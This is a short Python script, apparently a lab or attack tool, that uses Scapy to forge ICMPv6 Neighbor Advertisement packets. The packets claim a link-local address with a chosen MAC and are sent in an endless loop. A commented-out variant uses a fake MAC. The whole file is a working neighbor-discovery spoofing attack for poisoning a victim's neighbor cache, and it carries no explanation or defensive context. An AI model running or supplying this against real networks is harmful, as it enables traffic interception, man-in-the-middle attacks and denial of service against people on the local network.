from scapy.all import *


a=IPv6(src='fe80::215:5dff:fe00:1800', dst='fe80::743b:c3a3:9071:7587')
b=ICMPv6ND_NA(R=0, tgt='fe80::215:5dff:fe00:1800')
c=ICMPv6NDOptDstLLAddr(lladdr="00:15:5d:1d:18:00")

#pkt=Ether()/IPv6(src='fe80::215:5dff:fe00:1807', dst='fe80::743b:c3a3:9071:7587')/ICMPv6ND_NA(R=0, tgt='fe80::215:5dff:fe00:1807')/ICMPv6NDOptDstLLAddr(lladdr="cc:cc:cc:cc:cc:cc")


pkt=a/b/c

while True:
	send(pkt)